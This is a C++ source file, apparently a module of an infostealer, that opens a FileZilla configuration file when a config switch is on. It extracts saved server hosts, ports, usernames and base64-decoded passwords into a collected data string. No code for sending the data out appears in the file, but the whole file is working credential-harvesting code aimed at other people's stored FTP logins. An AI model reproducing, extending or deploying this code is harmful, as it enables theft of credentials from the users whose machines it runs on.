#include <fstream>

#include "config.h"
#include "utils.h"

#include "filezilla.h"

Filezilla::Filezilla(std::string path) noexcept
{
	if (!config::filezilla)
		return;

	if (!utils::isFile(path))
		return;

	std::ifstream file(path);
	std::string line;

	while (std::getline(file, line))
	{
		size_t length = this->lengthOfSubstr(line);

		if (line.find("<Host>") != std::string::npos)
		{
			this->data.append("HOST: " + line.substr(line.find(">") + 1, length));
		}

		else if (line.find("<Port>") != std::string::npos)
		{
			this->data.append(":" + line.substr(line.find(">") + 1, length) + "\n");
		}

		else if (line.find("<User>") != std::string::npos)
		{
			this->data.append("USER: " + line.substr(line.find(">") + 1, length) + "\n");
		}

		else if (line.find("<Pass") != std::string::npos)
		{
			//base 64 decode
			auto pw = utils::base64_decode(line.substr(line.find(">") + 1, length));
			this->data.append("PASSWORD: " + std::string(pw.begin(), pw.end()) + "\n\n");
		}
	}

	file.close();
}


size_t Filezilla::lengthOfSubstr(std::string str) noexcept
{
	return str.find("/") - str.find(">") - 2;
}
